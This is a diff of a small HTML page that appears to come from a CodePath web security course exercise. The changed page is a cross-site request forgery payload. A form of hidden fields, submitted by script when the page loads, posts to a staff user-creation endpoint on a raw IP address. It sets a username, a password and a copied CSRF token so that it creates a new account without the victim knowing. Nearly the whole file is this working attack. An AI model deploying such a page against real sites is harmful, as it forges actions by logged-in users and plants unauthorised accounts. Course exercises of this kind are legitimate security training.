@@ -1,7 +1,15 @@
-<form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
- <input type="hidden" name="userId" value="f7d1203dfeea38c877b09df0607df097eda6439f" />
+<form name="csrfForm" action="https://104.198.208.81/green/public/staff/users/new.php" method="POST">
+ <input type="hidden" name="first_name" value="csrf-added-user-name" />
+ <input type="hidden" name="last_name" value="csrf-added-user-surname" />
+ <input type="hidden" name="username" value="csrf-added-user" />
+ <input type="hidden" name="email" value="test@gmail.com" />
+ <input type="hidden" name="password" value="yZ2VWupD%21xwU+" />
+ <input type="hidden" name="confirm_password" value="yZ2VWupD%21xwU+" />
+ <input type="hidden" name="csrf_token" value="81fa41689be96eef6453f97ced032eee" />
+ <input type="hidden" name="submit" value="Create" />
  <input type="submit"/>
 </form>
 <script>
  document.csrfForm.submit();
 </script>
+
